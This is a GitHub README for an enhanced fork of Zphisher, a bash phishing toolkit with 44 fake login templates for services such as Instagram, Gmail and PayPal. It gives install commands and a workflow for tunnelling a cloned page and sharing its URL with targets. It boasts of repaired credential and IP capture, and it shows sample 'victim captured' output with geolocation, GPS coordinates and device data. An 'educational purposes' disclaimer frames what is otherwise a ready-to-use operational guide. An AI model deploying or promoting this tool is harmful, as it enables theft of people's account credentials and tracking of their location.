<!-- Zphisher Enhanced Edition - Fork -->

<p align="center">
  <img src=".github/misc/logo.png">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-2.3.5--Enhanced--v2-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/Fork%20of-htr--tech/zphisher-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/Platform-Termux%20%7C%20Linux-orange?style=for-the-badge">
  <img src="https://img.shields.io/github/license/htr-tech/zphisher?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Original%20Author-htr--tech-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Enhanced%20By-Darkrevengehack-darkgreen?style=flat-square">
  <img src="https://img.shields.io/badge/Open%20Source-Yes-darkgreen?style=flat-square">
  <img src="https://img.shields.io/badge/Written%20In-Bash-darkcyan?style=flat-square">
</p>

##

<h2 align="center">🔱 Enhanced Fork of Zphisher 🔱</h2>

<p align="center">
<b>This is an enhanced fork of the original <a href="https://github.com/htr-tech/zphisher">Zphisher</a> by <a href="https://github.com/htr-tech">htr-tech</a></b><br>
<i>Fixed critical bugs • Advanced geolocation • 44+ templates • Production-ready</i>
</p>

##

### 🆚 What's NEW in Enhanced Edition v2?

This version fixes **critical bugs** that prevented the original from working properly:

#### 🐛 Critical Fixes (Nov 2025)

**❌ BUGS FIXED:**
- ✅ **"404 Not Found" Error** - Added missing `index.html` to all 44 templates
- ✅ **IP Not Captured** - Fixed `ip.php` not being called by login pages
- ✅ **Empty IP Display** - Fixed IP parsing in Termux output
- ✅ **File Conflicts** - Templates now clean properly between uses
- ✅ **Android Compatibility** - Better Cloudflared handling on Termux

**🎯 These were BREAKING BUGS affecting all users who cloned the original repo.**

#### ✨ Enhanced Features

**📍 Advanced Geolocation (9 Data Points)**
- 🌍 Country, Region, City
- 🏢 ISP + Organization name
- 📍 GPS Coordinates (lat/lon)
- 🕐 Timezone detection
- 💻 Device type (Mobile/Tablet/Desktop)
- 🖥️ OS with version (Android 10, iOS 17, Windows 11, etc.)
- 🌐 Browser detection (Chrome, Firefox, Safari, Edge)
- 🔗 Referer + Full User-Agent

**🌐 Improved Tunneling**
- ⭐ **Serveo with Status Check** - Real-time online/offline detection
- ⚡ **LocalXpose with Warning** - Clear 15-minute limit notification
- 🛡️ **Cloudflared Android Warning** - Explicit compatibility notice
- 🧹 **Auto-cleanup** - Prevents file mixing between templates

**📊 Better Data Capture Format**
╔═══════════════════════════════════════════════════╗
║  🎯 VICTIM CAPTURED - 2025-11-02 04:05:35       ║
╚═══════════════════════════════════════════════════╝
🌐 IP Address : 190.172.41.62
🌍 Location   : San Martín, Mendoza, Argentina (AR)
🏢 ISP        : Telefonica de Argentina
📍 Coordinates: -33.0653, -68.4712
🕐 Timezone   : America/Argentina/Mendoza
💻 Device     : Mobile
🖥️  OS         : Android 10
🌐 Browser    : Chrome
**🎯 Tunnel Comparison**

| Tunnel | Status | Speed | Limit | Notes |
|--------|--------|-------|-------|-------|
| **Serveo** ⭐ | ✅ Excellent | Fast | Unlimited | Status check included |
| LocalXpose | ✅ Good | Medium | 15 min free | Warning shown |
| Cloudflared | ⚠️ Variable | Fast | Unlimited | Android warning |
| Localhost | ✅ Perfect | Very Fast | LAN only | Testing purposes |

##

<h3><p align="center">⚠️ Disclaimer</p></h3>

<i>Any actions and or activities related to <b>Zphisher</b> is solely your responsibility. The misuse of this toolkit can result in <b>criminal charges</b> brought against the persons in question. <b>The contributors will not be held responsible</b> in the event any criminal charges be brought against any individuals misusing this toolkit to break the law.

<b>This toolkit contains materials that can be potentially damaging or dangerous for social media</b>. Refer to the laws in your province/country before accessing, using,or in any other way utilizing this in a wrong way.

<b>This Tool is made for educational purposes only</b>. Do not attempt to violate the law with anything contained here. <b>If this is your intention, then Get the hell out of here</b>!

It only demonstrates "how phishing works". <b>You shall not misuse the information to gain unauthorized access to someones social media</b>. However you may try out this at your own risk.</i>

##

### 📋 Available Templates (44)

<details>
<summary><b>🌐 Social Media (14 templates)</b></summary>

- Instagram (4 variants: Traditional, Auto Followers, 1000 Followers, Blue Badge)
- Facebook (4 variants: Traditional, Advanced Poll, Security, Messenger)
- Twitter/X
- TikTok
- Snapchat
- LinkedIn
- VK (2 variants)
- Reddit
- Badoo
- DeviantArt
- Quora
</details>

<details>
<summary><b>🎮 Gaming & Streaming (8 templates)</b></summary>

- Discord
- Twitch
- Steam
- PlayStation
- Xbox
- Roblox
- Origin
- Spotify
</details>

<details>
<summary><b>📧 Email & Cloud (9 templates)</b></summary>

- Google/Gmail (3 variants: Old, New, Poll)
- Microsoft/Outlook
- Yahoo
- ProtonMail
- Yandex
- Dropbox
- WordPress
</details>

<details>
<summary><b>💳 Finance & Services (13 templates)</b></summary>

- PayPal
- Netflix
- Adobe
- eBay
- GitHub
- GitLab
- Mediafire
- Pinterest
- StackOverflow
</details>

##

### 🚀 Installation

#### Quick Install (Termux/Linux)

```bash
# Clone this WORKING fork (bugs fixed)
git clone --depth=1 https://github.com/Darkrevengehack/zphisher-enhanced.git

# Navigate to directory
cd zphisher-enhanced

# Run Zphisher
bash zphisher.sh
Or install original version (with known bugs):
git clone --depth=1 https://github.com/htr-tech/zphisher.git
📱 Installation (Termux)
# Update packages
pkg update && pkg upgrade -y

# Install dependencies
pkg install git php curl openssh -y

# Clone this enhanced fork
git clone --depth=1 https://github.com/Darkrevengehack/zphisher-enhanced.git
cd zphisher-enhanced
bash zphisher.sh
⚠️ A Note:
Termux discourages hacking. Never discuss anything related to zphisher in Termux groups. For more: wiki
🐧 Installation (Linux)
# Install dependencies
sudo apt update
sudo apt install git php curl openssh-client -y

# Clone and run
git clone --depth=1 https://github.com/Darkrevengehack/zphisher-enhanced.git
cd zphisher-enhanced
bash zphisher.sh

📖 Usage
Recommended Workflow (Enhanced)
Start Zphisher
cd zphisher-enhanced
bash zphisher.sh
Choose Template (e.g., Instagram → Traditional)
Select Tunnel (Recommendations):
🥇 Option 02 - Serveo (Best - Recommended)
🥈 Option 03 - LocalXpose (Backup - 15min limit)
🥉 Option 04 - Cloudflared (May fail on Android)
Copy Generated URL and share it
Monitor Captures in real-time
Enhanced Output Example:
[-] URL 1 : https://abc123.serveo.net

[-] Waiting for Login Info, Ctrl + C to exit...

[-] Victim IP Found !
[-] Victim's IP : 190.172.41.62
[-] Saved in : auth/ip.txt
Data captured in auth/ip.txt:
Full geolocation (Country, City, ISP)
Device info (Mobile/Desktop, OS, Browser)
GPS coordinates + Timezone
Complete User-Agent

🔧 Dependencies
Required:
git
curl
php (7.4+)
openssh-client (for Serveo tunnel)
All dependencies are installed automatically on first run.

✅ Tested on
Enhanced Edition tested on:
✅ Termux (Android 10, 11, 12, 13, 14)
✅ Ubuntu (20.04, 22.04, 24.04)
✅ Debian (11, 12)
✅ Kali Linux (2024.x)
✅ Arch Linux
✅ Fedora
Original Zphisher also works on:
Manjaro, Other Debian-based distros

🐛 Troubleshooting (Enhanced Edition)
Problem: "404 Not Found" when opening URL
Fixed in v2 ✅ All templates now include index.html
Problem: IP not captured
Fixed in v2 ✅ All login.html now call ip.php correctly
Problem: IP shows empty in Termux
Fixed in v2 ✅ Log format now compatible with capture_ip()
Cloudflared doesn't work on Android
Solution: Use Serveo (Option 02) - Better compatibility
LocalXpose disconnects after 15 minutes
Expected: Free tier limitation. Upgrade or use Serveo.

🆚 Enhanced v2 vs Original
Feature
Original v2.3.5
This Fork (Enhanced v2)
Templates
30
44
index.html
❌ Missing (404 error)
✅ All templates
IP Tracking
❌ Broken
✅ Fixed + Enhanced
Geolocation
Basic IP
📍 9 data points
Serveo Status
❌
✅ Real-time check
Error Handling
Basic
🛡️ Comprehensive
Warnings
❌
✅ LocalXpose/Cloudflared
Auto-cleanup
❌
✅ Prevents file mixing

🤝 Contributing
To This Fork:
Report issues specific to enhancements
Suggest new features
Improve documentation
To Original Project:
For original Zphisher features: htr-tech/zphisher

📜 License
GPL-3.0 License - Same as original project
This is a fork and derivative work of Zphisher by htr-tech, licensed under GPL-3.0.

👏 Credits
🌟 Original Zphisher
Author: htr-tech (Tahmid Rayat)
Repository: htr-tech/zphisher
License: GPL-3.0
Please ⭐ star the original repository too!
✨ Enhanced Edition v2
Fork & Enhancements: Darkrevengehack (2025)
Major Fixes:
Added missing index.html to all templates
Fixed IP tracking system
Fixed geolocation capture
Improved tunnel reliability
Better error messages
🙏 Special Thanks:
Original Zphisher team and contributors
Users who reported the bugs
Termux community
Tunnel providers: Serveo, Cloudflared, LocalXpose

📞 Links
This Fork (Enhanced): github.com/Darkrevengehack/zphisher-enhanced
Original Project: github.com/htr-tech/zphisher
Report Issues (Enhanced): Issues

💝 Thanks to Original Contributors
[List maintained from original project]

�
⭐ If you find this enhanced fork useful, please star both this repo and the original! ⭐ 


�
Fork maintained with ❤️ for the cybersecurity community
Built upon the excellent work of htr-tech 

